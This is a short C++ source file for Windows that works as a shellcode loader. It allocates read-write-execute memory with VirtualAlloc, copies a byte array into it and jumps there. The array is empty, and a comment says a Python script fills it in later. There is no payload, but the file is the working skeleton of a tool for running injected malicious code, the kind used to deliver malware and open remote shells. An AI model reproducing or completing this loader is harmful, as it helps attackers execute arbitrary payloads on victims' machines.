#include <windows.h>
#include <iostream>

unsigned char shellcode[] = ""; // This part will be filled with Python code

int main() {
    // Calculate shellcode length
    size_t shellcode_len = sizeof(shellcode);

    // Allocate memory for shellcode
    void* exec = VirtualAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec) {
        std::cerr << "Bellek ayırma başarısız!" << std::endl;
        return 1;
    }

    // Copy shellcode to memory
    memcpy(exec, shellcode, shellcode_len);

    // Run shellcode
    ((void(*)())exec)();

    return 0;
}
